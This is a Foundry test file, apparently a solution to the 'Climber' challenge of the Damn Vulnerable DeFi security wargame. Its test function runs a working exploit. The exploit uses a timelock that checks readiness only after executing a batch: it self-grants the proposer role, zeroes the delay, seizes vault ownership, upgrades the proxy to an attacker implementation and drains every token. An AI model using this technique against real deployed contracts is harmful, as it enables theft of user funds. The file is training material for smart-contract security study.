// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

import {ERC1967Proxy} from  "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {ADMIN_ROLE, PROPOSER_ROLE} from "@main/climber/ClimberConstants.sol";

import {DamnValuableToken} from "@main/DamnValuableToken.sol";
import {ClimberTimelock} from "@main/climber/ClimberTimelock.sol";
import {ClimberVault} from "@main/climber/ClimberVault.sol";

import {ClimberAttackerVaultImp, ClimberScheduler} from "@main/climber/ClimberAttacker.sol";

contract ClimberTest is Test {

    string mnemonic ="test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

    address deployer = vm.addr(deployerPrivateKey);
    address public attacker;
    address public proposer;
    address public sweeper;

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000 ether;
    
    ClimberVault vault;
    ClimberTimelock vaultTimelock;
    DamnValuableToken token;

    ClimberScheduler scheduler;
    ClimberAttackerVaultImp newVaultImpl;

    function setUp() public {
        vm.startPrank(deployer);

        attacker = makeAddr("Attacker");
        proposer = makeAddr("Proposer");
        sweeper = makeAddr("Sweeper");

        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");
        vm.label(proposer, "Proposer");
        vm.label(sweeper, "Sweeper");

        deal(attacker, 0.1 ether);
        assertEq(attacker.balance, 0.1 ether);

        vm.stopPrank(  );
    }

    modifier beforeEach() {
        vm.startPrank(deployer);

        ClimberVault vaultImplementation = new ClimberVault();
        vm.label(address(vaultImplementation), "ClimberVault Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        ERC1967Proxy vaultProxy = new ERC1967Proxy(
            address(vaultImplementation),
            data
        );
        vault = ClimberVault(address(vaultProxy));
        vm.label(address(vault), "ClimberVault Proxy");

        assertEq(vault.getSweeper(), sweeper);
        assertEq(vault.getLastWithdrawalTimestamp(), block.timestamp);
        assertEq(vault.owner() == address(0), false);
        assertEq(vault.owner() == deployer, false);

        // timelock
        vaultTimelock = ClimberTimelock(payable(vault.owner()));
        vm.label(address(vaultTimelock), "ClimberTimelock");

        assertEq(vaultTimelock.hasRole(PROPOSER_ROLE, proposer), true);
        assertEq(vaultTimelock.hasRole(ADMIN_ROLE, deployer), true);

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank(  );
        _;
    }

    function test_isSolved( ) public beforeEach() {
        vm.startPrank(attacker);

        scheduler = new ClimberScheduler();

        // there is re-entrancy on this line ; This should be before interactions

        // if (getOperationState(id) != OperationState.ReadyForExecution) {
        //     revert NotReadyForExecution(id);
        // }

        // prepare the data for 3 different actions
        bytes32 salt = keccak256("attack");
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory data = new bytes[](4);

        // transfer the ownership of the Vault contract to the attacker
        targets[0] = address(vault);
        values[0] = 0;
        data[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);

        // grant the role address to an external contract
        targets[1] = address(vaultTimelock);
        values[1] = 0;
        data[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(scheduler));

        // update the delay
        targets[2] = address(vaultTimelock);
        values[2] = 0;
        data[2] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // schedule the proposal
        targets[3] = address(scheduler);
        values[3] = 0;
        data[3] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)", attacker, address(vault), address(vaultTimelock), salt);

        vaultTimelock.execute(targets, values, data, salt);

        newVaultImpl = new ClimberAttackerVaultImp();
        vault.upgradeTo(address(newVaultImpl));

        ClimberAttackerVaultImp(address(vault)).withdrawAll(address(token));

        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(attacker), VAULT_TOKEN_BALANCE);
       
        vm.stopPrank( );
    }
    
}